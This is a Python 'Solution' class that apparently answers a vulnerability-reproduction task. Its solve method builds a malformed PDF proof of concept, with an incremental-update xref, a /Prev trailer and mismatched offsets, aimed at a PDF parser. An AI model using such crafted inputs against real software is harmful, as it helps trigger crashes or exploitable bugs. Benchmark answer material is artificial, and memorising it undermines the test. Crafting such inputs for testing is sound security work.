class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'%PDF-1.4\n%\xf7\xf7\xf7\xf7\n'
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
        obj3_base = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n'
        base_body = header + obj1 + obj2 + obj3_base
        xref_base = b'xref\n0 4\n0000000000 65535 f \n0000000014 00000 n \n0000000063 00000 n \n0000000120 00000 n \n'
        trailer_base = b'trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n190\n%%EOF\n'
        base_pdf = base_body + xref_base + trailer_base
        obj3_new = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 300] >>\nendobj\n'
        new_offset = len(base_pdf)
        offset_str = f"{new_offset:010d}"
        xref_new = b'xref\n3 1\n' + offset_str.encode('ascii') + b' 00000 n \n'
        new_xref_start = new_offset + len(obj3_new)
        new_xref_start_str = str(new_xref_start)
        trailer_new = b'trailer\n<< /Size 4 /Root 1 0 R /Prev 190 >>\nstartxref\n' + new_xref_start_str.encode('ascii') + b'\n%%EOF\n'
        poc = base_pdf + obj3_new + xref_new + trailer_new
        return poc